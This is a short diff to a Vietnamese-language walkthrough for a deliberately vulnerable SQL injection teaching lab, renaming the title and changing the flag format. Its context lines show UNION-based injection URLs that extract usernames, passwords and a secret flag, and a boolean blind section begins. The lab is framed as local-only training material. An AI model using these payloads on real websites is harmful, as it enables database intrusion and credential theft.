@@ -1,4 +1,4 @@
-# Hướng dẫn chạy khai thác từng trường hợp — SQLi Lab DBS401
+# Hướng dẫn chạy khai thác từng trường hợp — SQLi Lab
 
 > ⚠️ Chỉ chạy trên `127.0.0.1`. Lab giáo dục, cố ý chứa lỗ hổng.
 
@@ -38,7 +38,7 @@ Thủ công (trình duyệt):
 /products?id=0 UNION SELECT id,username,password FROM users
 /products?id=0 UNION SELECT 1,name,flag FROM admin_secrets
 ```
-→ Lấy creds + `DBS401{m4nu4l_sql1_m4st3r}`.
+→ Lấy creds + `FLAG{m4nu4l_sql1_m4st3r}`.
 
 ## 3. Boolean blind
 ```bash
